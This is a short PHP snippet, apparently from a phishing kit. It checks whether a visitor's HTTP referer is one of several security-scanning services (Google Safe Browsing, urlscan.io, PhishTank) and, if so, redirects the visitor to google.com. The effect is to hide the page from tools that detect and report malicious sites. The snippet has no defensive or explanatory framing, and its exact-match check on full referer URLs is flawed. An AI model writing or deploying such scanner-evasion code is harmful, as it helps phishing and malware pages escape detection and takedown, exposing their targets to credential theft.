<?php
$block = array("safebrowsing.google.com","urlscan.io", "phishtank.com");

if (in_array ($_SERVER['HTTP_REFERER'], $block)) {
  header("Location: http://google.com/");
  exit();
}
?>